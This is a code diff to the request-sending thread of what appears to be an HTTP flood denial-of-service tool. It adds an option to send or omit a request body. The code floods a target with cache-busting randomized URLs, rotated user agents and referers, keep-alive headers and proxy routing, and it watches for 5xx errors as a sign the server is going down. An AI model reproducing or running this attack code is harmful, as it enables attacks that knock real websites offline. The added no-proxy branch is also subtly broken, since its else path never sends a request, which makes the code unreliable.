@@ -112,6 +112,7 @@ class httpcall(threading.Thread):
         self.normaldelay = int(config["thread"]["normaldelay"])
         self.usenormaldelay = config["thread"]["usenormaldelay"]
         self.nodelay = config["thread"]["nodelay"]
+        self.usepayload = config["usepayload"]
         
         self.useproxies = config["useproxies"]
         self.limiter = config["thread"]["limiter"]
@@ -136,15 +137,27 @@ class httpcall(threading.Thread):
                     continue
                 if proxy == "":
                     try:
-                        lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers={
-                            "User-Agent": random.choice(self.useragents),
-                            "Cache-Control": "no-cache",
-                            "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
-                            "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
-                            "Keep-Alive": str(random.randint(110,120)),
-                            "Connection": "keep-alive",
-                            "Host": usehost
-                        }, data=self.payload, timeout=self.timeout)
+                        if self.usepayload == True:
+                            lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers={
+                                "User-Agent": random.choice(self.useragents),
+                                "Cache-Control": "no-cache",
+                                "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
+                                "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                                "Keep-Alive": str(random.randint(110,120)),
+                                "Connection": "keep-alive",
+                                "Host": usehost
+                            },data=self.payload, timeout=self.timeout)
+                        else:
+                            if self.usepayload == True:
+                                lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers={
+                                "User-Agent": random.choice(self.useragents),
+                                "Cache-Control": "no-cache",
+                                "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
+                                "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                                "Keep-Alive": str(random.randint(110,120)),
+                                "Connection": "keep-alive",
+                                "Host": usehost
+                            }, timeout=self.timeout)
                         #print(lres.text)
                         #proxies.append(proxy)
                         if str(lres.status_code).startswith("50"):
@@ -167,18 +180,32 @@ class httpcall(threading.Thread):
                             set_flag(2)
                 else:
                     try:
-                        lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers={
-                            "User-Agent": random.choice(self.useragents),
-                            "Cache-Control": "no-cache",
-                            "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
-                            "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
-                            "Keep-Alive": str(random.randint(110,120)),
-                            "Connection": "keep-alive",
-                            "Host": usehost
-                        }, data=self.payload, timeout=self.timeout, proxies={
-                            "http":"http://"+proxy,
-                            "https":"http://"+proxy,
-                        })
+                        if self.usepayload == True:
+                            lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers={
+                                "User-Agent": random.choice(self.useragents),
+                                "Cache-Control": "no-cache",
+                                "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
+                                "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                                "Keep-Alive": str(random.randint(110,120)),
+                                "Connection": "keep-alive",
+                                "Host": usehost
+                            }, data=self.payload, timeout=self.timeout, proxies={
+                                "http":"http://"+proxy,
+                                "https":"http://"+proxy,
+                            })
+                        else:
+                            lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers={
+                                "User-Agent": random.choice(self.useragents),
+                                "Cache-Control": "no-cache",
+                                "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
+                                "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                                "Keep-Alive": str(random.randint(110,120)),
+                                "Connection": "keep-alive",
+                                "Host": usehost
+                            }, timeout=self.timeout, proxies={
+                                "http":"http://"+proxy,
+                                "https":"http://"+proxy,
+                            })
                         proxies.append(proxy)
                         if str(lres.status_code).startswith("50"):
                             #set_flag(1)
